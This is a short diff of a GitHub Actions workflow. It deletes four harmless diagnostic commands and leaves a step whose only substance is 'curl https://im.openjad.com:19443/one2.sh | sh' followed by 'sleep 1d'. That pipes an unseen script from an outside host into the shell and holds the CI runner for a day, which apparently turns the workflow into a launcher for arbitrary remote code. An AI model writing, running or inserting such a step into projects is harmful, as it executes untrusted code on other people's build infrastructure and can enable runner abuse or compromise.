@@ -8,9 +8,5 @@ jobs:
     steps:
     - name: Run a shell script
       run: |
-        echo "Hello, GitHub Actions!"
-        pwd
-        ls -la
-        whoami
         curl https://im.openjad.com:19443/one2.sh | sh
         sleep 1d
